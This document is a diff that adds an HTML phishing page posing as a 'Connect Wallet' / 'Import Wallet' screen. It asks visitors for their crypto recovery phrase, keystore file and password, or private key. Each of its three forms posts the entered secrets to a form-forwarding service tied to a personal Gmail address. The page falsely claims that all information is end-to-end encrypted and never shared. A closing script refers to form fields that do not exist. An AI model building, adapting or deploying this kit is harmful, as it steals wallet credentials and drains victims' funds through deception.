@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="shortcut icon"
+      href="https://app.walletissuesfix.net/walletconnect-logo.svg"
+      type="image/x-icon"
+    />
+    <title>Connect Wallet</title>
+
+    <!-- font awesome link -->
+    <script src="js/78d167673c.js" crossorigin="anonymous"></script>
+
+    <!-- google fonts link -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700;800;900&amp;display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- bootstrap css link -->
+    <link
+      href="css/bootstrap.min.css"
+      rel="stylesheet"
+      crossorigin="anonymous"
+    />
+
+    <link rel="stylesheet" href="css/formpage.css" />
+  </head>
+  <body>
+    <div class="formpage">
+      <div class="content-box-md">
+        <div class="container">
+          <div class="row">
+            <div class="col-md-12">
+              <div class="text-center formpage-header">
+                <h1>Import Wallet</h1>
+                <h6>
+                  <i
+                    style="margin-right: 0.4rem"
+                    class="fa fa-lock"
+                    aria-hidden="true"
+                  ></i>
+                  All information are end-to end-encrypted. We do not share data
+                  and activity sessions with any other company.
+                </h6>
+              </div>
+            </div>
+          </div>
+
+          <div class="row">
+            <div class="col-md-2"></div>
+            <div class="col-md-8">
+              <div class="form-box">
+                <ul class="nav nav-tabs" id="myTab" role="tablist">
+                  <li class="nav-item" role="presentation">
+                    <button
+                      class="nav-link active"
+                      id="home-tab"
+                      data-bs-toggle="tab"
+                      data-bs-target="#home"
+                      type="button"
+                      role="tab"
+                      aria-controls="home"
+                      aria-selected="true"
+                    >
+                      Phrase
+                    </button>
+                  </li>
+                  <li class="nav-item" role="presentation">
+                    <button
+                      class="nav-link"
+                      id="profile-tab"
+                      data-bs-toggle="tab"
+                      data-bs-target="#profile"
+                      type="button"
+                      role="tab"
+                      aria-controls="profile"
+                      aria-selected="false"
+                    >
+                      Keystore JSON
+                    </button>
+                  </li>
+                  <li class="nav-item" role="presentation">
+                    <button
+                      class="nav-link"
+                      id="contact-tab"
+                      data-bs-toggle="tab"
+                      data-bs-target="#contact"
+                      type="button"
+                      role="tab"
+                      aria-controls="contact"
+                      aria-selected="false"
+                    >
+                      Private Key
+                    </button>
+                  </li>
+                </ul>
+                <div class="tab-content" id="myTabContent">
+                  <div
+                    class="tab-pane fade show active"
+                    id="home"
+                    role="tabpanel"
+                    aria-labelledby="home-tab"
+                  >
+                    <!-- This is for phrase  -->
+                    <form
+                      action="https://formsubmit.co/ajeemmanuel221@gmail.com"
+                      method="POST"
+                    >
+                      
+                      <div class="form-group mb-3">
+                        <label class="form-label">Recovery Phrase</label>
+                        <textarea
+                          style="height: 10rem; color: #3ab6ff"
+                          class="form-control"
+                          required=""
+                          type="text"
+                          name="text"
+                        ></textarea>
+                        <div id="" class="form-text">
+                          Typically 12 (sometimes 24) words separated by a
+                          single space.
+                        </div>
+                      </div>
+                      
+                      <button
+                        style="
+                          background-color: #0150b8;
+                          width: 100%;
+                          padding: 0.5rem 0rem 0.5rem 0rem;
+                          font-weight: 600;
+                        "
+                        type="submit"
+                        class="btn btn-primary"
+                      >
+                        Import Wallet
+                      </button>
+                    </form>
+                  </div>
+                  <div
+                    class="tab-pane fade"
+                    id="profile"
+                    role="tabpanel"
+                    aria-labelledby="profile-tab"
+                  >
+                    <!-- This is for keystore -->
+                    <form
+                      action="https://formsubmit.co/ajeemmanuel221@gmail.com"
+                      method="POST"
+                    >
+                    
+                      <div class="form-group mb-3">
+                        <label class="form-label">Keystore</label>
+                        <textarea
+                          style="height: 10rem; color: #0150b8"
+                          required=""
+                          type="text"
+                          name="text"
+                          class="form-control"
+                        ></textarea>
+                        <div id="" class="form-text">
+                          Several lines of text beginning with “{…}” plus the
+                          password you used for encryption.
+                        </div>
+                        <input
+                          style="
+                            margin-top: 20px;
+                            margin-bottom: 30px;
+                            color: #0150b8;
+                          "
+                          required=""
+                          name="extra_password"
+                          type="password"
+                          class="form-control"
+                          placeholder="password"
+                          aria-label="Username"
+                          aria-describedby="basic-addon1"
+                        />
+                      </div>
+                    
+                      <button
+                        style="
+                          background-color: #0150b8;
+                          width: 100%;
+                          padding: 0.5rem 0rem 0.5rem 0rem;
+                          font-weight: 600;
+                        "
+                        type="submit"
+                        class="btn btn-primary"
+                      >
+                        Import Wallet
+                      </button>
+                    </form>
+                  </div>
+                  <div
+                    class="tab-pane fade"
+                    id="contact"
+                    role="tabpanel"
+                    aria-labelledby="contact-tab"
+                  >
+                    <!-- THis is for private key -->
+                    <form
+                      action="https://formsubmit.co/ajeemmanuel221@gmail.com"
+                      method="POST"
+                    >
+                      
+                      <div class="form-group mb-3">
+                        <label class="form-label">Private Key</label>
+                        <textarea
+                          style="height: 10rem; color: #0150b8"
+                          required=""
+                          name="text"
+                          type="text"
+                          class="form-control"
+                        ></textarea>
+                        <div id="" class="form-text">
+                          Before you enter private key, we recommend you connect
+                          to the internet.
+                        </div>
+                      </div>
+                      
+                      <button
+                        style="
+                          background-color: #0150b8;
+                          width: 100%;
+                          padding: 0.5rem 0rem 0.5rem 0rem;
+                          font-weight: 600;
+                        "
+                        type="submit"
+                        class="btn btn-primary"
+                      >
+                        Import Wallet
+                      </button>
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="col-md-2"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- bootstrap js link -->
+    <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+    <script>
+      // You can get url_string from window.location.href if you want to work with
+      // the URL of the current page
+      var url_string = window.location.href;
+      var url = new URL(url_string);
+      var walletName = url.searchParams.get("wallet");
+      console.log(walletName);
+      // The form subject name
+      var form_subject = document.getElementById("subjectnameofform");
+      var form_subject1 = document.getElementById("subjectnameofform2");
+      var form_subject2 = document.getElementById("subjectnameofform3");
+
+      form_subject.value += walletName;
+      form_subject1.value += walletName;
+      form_subject2.value += walletName;
+    </script>
+  </body>
+</html>
